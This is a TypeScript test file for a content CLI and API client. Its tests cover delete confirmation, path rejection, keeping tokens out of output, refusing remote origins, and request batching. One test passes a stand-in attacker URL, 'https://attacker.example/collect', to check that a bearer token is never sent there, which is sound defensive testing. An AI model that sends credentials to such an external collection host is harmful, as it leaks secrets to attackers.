import { expect, test } from "bun:test";
import { runContentCLI, splitCandidates } from "../../scripts/content";
import type { ContentMetadata } from "../../src/content/contracts";
import { createContentClient } from "../../scripts/content-client";

test("delete without --yes never reaches the content API", async () => {
  const output: string[] = [];
  const code = await runContentCLI(
    ["delete", "post-1", "--version", "1"],
    {
      stdout: (text) => output.push(text),
      stderr: (text) => output.push(text),
    },
    { CONTENT_API_URL: "http://127.0.0.1:5173" },
  );

  expect(code).toBe(2);
  expect(output.join("")).toContain("--yes");
});

test("CLI rejects published Markdown paths before requiring an API token", async () => {
  const errors: string[] = [];
  const code = await runContentCLI(
    ["import", "pages/vi/library/khoi-nguon.md"],
    { stdout: () => {}, stderr: (text) => errors.push(text) },
    {},
  );

  expect(code).toBe(2);
  expect(errors.join("")).toContain("pages/*/library");
});

test("CLI rejects a token argument without echoing its value", async () => {
  const secretLikeValue = "do-not-print-this-token";
  const errors: string[] = [];
  const code = await runContentCLI(
    ["list", "--locale", "vi", "--token", secretLikeValue],
    { stdout: () => {}, stderr: (text) => errors.push(text) },
    {},
  );

  expect(code).toBe(2);
  expect(errors.join("")).not.toContain(secretLikeValue);
});

test("content client rejects remote HTTP origins before transport", () => {
  let fetchCalled = false;
  expect(() =>
    createContentClient({
      baseURL: "http://api.example.test",
      fetcher: async () => {
        fetchCalled = true;
        return Response.json({});
      },
    }),
  ).toThrow();
  expect(fetchCalled).toBe(false);
});

test("content client never sends a bearer token to an absolute external URL", async () => {
  let requestURL: RequestInfo | URL | undefined;
  const client = createContentClient({
    baseURL: "http://127.0.0.1:5173",
    token: "R".repeat(43),
    fetcher: async (input) => {
      requestURL = input;
      return Response.json({});
    },
  });

  await expect(client.request("https://attacker.example/collect")).rejects.toThrow();
  expect(requestURL).toBeUndefined();
});

test("offline content check validates and counts the local Markdown manifest", async () => {
  const output: string[] = [];
  const code = await runContentCLI(
    ["check"],
    { stdout: (text) => output.push(text), stderr: () => {} },
    {},
  );

  expect(code).toBe(0);
  expect(JSON.parse(output.join(""))).toEqual({ ok: true, candidateCount: 3 });
});

test("content preflight batches keep large multilingual metadata under the request cap", () => {
  const entries: ContentMetadata[] = Array.from({ length: 101 }, (_, index) => ({
    translationKey: `key-${index}`.padEnd(160, "k"),
    locale: "zh-CN",
    slug: `post-${index}`.padEnd(160, "x"),
    kind: "article",
    title: "你".repeat(200),
    description: "你".repeat(500),
    status: "published",
    publishedAt: "2026-10-19T00:00:00.000Z",
    startsAt: null,
    endsAt: null,
    location: "你".repeat(200),
  }));
  const batches = splitCandidates(entries);

  expect(batches.map((batch) => batch.length)).toEqual([100, 1]);
  for (const batch of batches) {
    expect(new TextEncoder().encode(JSON.stringify({ entries: batch })).byteLength).toBeLessThan(
      1_048_576,
    );
  }
});
